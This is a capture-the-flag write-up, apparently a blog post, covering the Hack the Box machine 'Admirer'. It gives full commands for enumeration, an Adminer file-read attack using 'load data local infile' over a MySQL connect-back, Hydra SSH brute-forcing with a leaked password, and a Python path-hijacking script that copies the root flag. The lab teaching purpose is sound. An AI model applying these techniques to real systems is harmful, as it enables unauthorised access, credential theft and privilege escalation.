+++
author = "Nick"
categories = ["hack the box", "easy", "Linux", "gobuster", "adminer", "hydra", "bruteforce", "python", "path hijacking"]
date = 2020-09-26T14:56:42Z
description = ""
draft = false
thumbnail = "//images/2020/05/info-3.png"
slug = "hack-the-box-admirer"
summary = "Today we are going to be doing the Hack the Box machine Admirer. This machine is listed as Easy Linux machine. Let's jump in!\n"
tags = ["hack the box", "easy", "Linux", "gobuster", "adminer", "hydra", "bruteforce", "python", "path hijacking"]
title = "Hack the Box - Admirer"

+++


Welcome back everyone! Today we are going to be doing the Hack the Box machine Admirer. This machine is listed as Easy Linux machine. Let's jump in!

As always, we start with an `nmap` scan: `nmap -sC -sV -p- -oA allscan 10.10.10.187`

Here are our results:

```
Nmap scan report for 10.10.10.187
Host is up (0.048s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We don't have that much to work with, so we'll see what's being hosted on port 80. We have a basic site. We check the source out and see the contact form isn't functional. We know from our `nmap` scan that there is a directory called `/admin-dir` that we don't want parsed by search engines. When we `curl` the `robots.txt` file we see there are potentially credentials inside.

![](/images/2020/05/image-55.png)

We'll kick off a `gobuster` scan to see what might in that directory as well.

Command:
`gobuster dir -u 10.10.10.187/admin-dir -w /usr/share/wordlists/dirb/big.txt -x txt,php`

I tried a few wordlists but this one yeilded the best results. We also didn't thread this command because the box was so unstable. We get two hits after the scan completes.

![](/images/2020/05/image-57.png)

We download the `credentials.txt` and the `contacts.txt` to see what's inside. Sure enough, we have credentials! Now we're going to make two files, one for users and one for passwords and store them accordingly. Since we have the `FTP` port open, we'll use the `FTP` credentials given to us and login.

![](/images/2020/05/image-56.png)

We have two files listed here. We'll issue a command to download them both.

Command:
`mget *.*`

With both files downloaded, we can start looking at what might be inside. The `dump.sql` file only has data for what seems to be the website. We can untar the `html.tar.gz` file and see what might be contained there.

Command:
`tar -xvf html.tar.gz`

This extracts and gives us a decent directory strucure. If you `tree` the directory, you'll see it's seems to be a backup of dev version of the current site.

![](/images/2020/05/image-58.png)

This is the portion of the site that we find the most usefull. If we look at this `robots.txt` we see it's the same as the 'live' version, with one minor difference. In the dev version of the site the `/admin-dir` is called `w4ld0s_s3cr3t_d1r`. If we try to go to `/utility-scripts` location on production, we see it is forbiden, so it does exsist. We look a the `index.php` file as well, and see some hardcoded credentials as well as a database name.

![](/images/2020/05/image-59.png)

We'll add these to our username and password lists and continue to enumerate. If we look at the `db_admin.php` page we see more credentials as well as an interesting note - `"// TODO: Finish implementing this or find a better open source alternative"`. Now if we try to navigate to `/db_admin.php` we see it doesn't exist. We can reasonably assume it has been replaced with an opensource tool. Some googling for 'opensource db management' led me to a list of the top 10. First on the list was a tool called Adminer.

From past CTF's we have some web fuzzing wordlists, there are also some in `seclists` as well. This [Github repo](https://github.com/kaimi-io/web-fuzz-wordlists) by Kaimi-io is really good in this situation. So naturally we use the `adminer.txt` list with `gobuster` and found `/adminer.php`.

Command:
`gobuster dir -u admirer.htb/utility-script/ -w /usr/share/seclists/web-fuzz-wordlists/adminer.txt`

When we navigate to the page we are greeted with the Adminer login page.

![](/images/2020/05/image-60.png)

We try the credentials that we've gotten but none of them work. A quick google for 'Adminer exploit' and we get [this](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool). They were even kind enough to give us a video PoC!. Here's what we need to do: 
* Enable our our MYSQL DB, create a user and database in it. 
* Go back to the Adminer web interface and connect back to our database. 
* Create our own table to dump data into. 
* After that we can then use the `load data local infile` command to load resources from that machine into our table.

So first we start up `mysql`.

Command:
`service mysql start`

Now connect to the service and create a user and database.

Command:
`mysql -u root` NOTE: This only works on unmodified Kali instances. You will need to supply a password otherwise.
`MariaDB [(none)]> create user testuser@'%' identified by 'password';`
`MariaDB [(none)]> create database testdb;`
`MariaDB [(none)]> grant all privileges on testdb.* to 'testuser';`

Now that our user and DB is created we need to modify our Bind address for our server. If we don't do this you will get Connection Refused from the Adminer.php page. Inside the `50-server.cnf` file we can change this to our HTB issued IP:

Command:
`nano /etc/mysql/mariadb.conf.d/50-server.cnf`

![](/images/2020/05/image-61.png)

Then we restart the service.

Command:
`service mysql restart`

With that all complete we should be able to connect back to our system via the Adminer web interface.

![](/images/2020/05/admirer_adminer.gif)

Once we're logged in we create a table inside our `testdb`.

![](/images/2020/05/image-62.png)

Now we can run an the sql command to obtain data:

```sql
load data local infile '../index.php'
into table testdb.t1
fields terminated by "\n"
```

![](/images/2020/05/admirer_file_load.gif)

If that runs sucessfully, we should have the content of our index page in our newly created table.

Now when we look at the table we do indeed see the index.php loaded in. When we look further we see the credentials on the page are different than the ones we currently have.

![](/images/2020/05/image-63.png)

We'll add this to our list of credentials as well. We repeat the process for other pages but nothing else is of use. We have a fairly large list of users and passwords at this point. We can use `Hydra` to attempt to brute force our way into the box via `SSH`.

Command:
`hydra -V -L users -P passwords ssh://admirer.htb`

![](/images/2020/05/admirer_hydra.gif)

Sure enough we find a combo that works - `Waldo:&<h5b~yK3F#{PaPB&dA}{H>` We log in via `SSH` and get our `user.txt` flag! Now that we're in, we need to enumerate internally. In this case we'll copy over `linPEAS` and see what it shows. We see these two entries that are paticularly interesting:

![](/images/2020/05/image-64.png)

![](/images/2020/05/image-65.png)

If we look at the script `admin_tasks.sh` we see this line of code:

![](/images/2020/05/image-66.png)

This file is being called and we have the ability to read the file as well. So let's take a look at this script too.

![](/images/2020/05/image-67.png)

At first glance it might not seem obvious but when we piece together all three of our priviledges combined, we see the picture a bit more clearly. We can `SETENV` in our sudo command. We can call a script that runs another script as root. We can view the contents of a key script written in python. We're going to leverage [Python Path Hijacking](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1542133788.pdf) or [Python Module Hijacking](http://savagejen.github.io/blog/2013/04/28/python-module-hijacking/). 

We will tell the Linux system what our PYTHON path is. Then we'll create a fake `shutil.py` library that gets called when we execute the script. Since the script runs that command as root, the script also runs as root, so we'll copy the root flag somewhere else.

First lets make a new directory and set it as the `PYTHON PATH`.

Command:
`mkdir rfio`
`export PYTHONPATH='/tmp/rfio'`

Next we'll make our fake `shutil.py` library.

Command:
`nano shutil.py`

With the following code:
```python
#!/usr/bin/python3

import  os

def make_archive():
    os.system('cp /root/root.txt /tmp/rfio/root.txt')
    os.system('chmod 755 /tmp/rfio/root.txt')
	
make_archive()
```
`chmod +x shutil.py`

Now we just call the `admin_task.sh` script.

Command:
`sudo PYTHONPATH=/tmp/rfio /opt/scripts/admin_task.sh`

![](/images/2020/05/admirer_root.gif)

There we have it, the root flag has been copied over!

Think about sending me some respect over on HTB if you enjoyed the write-up! Here's my [profile](https://www.hackthebox.eu/home/users/profile/95635).



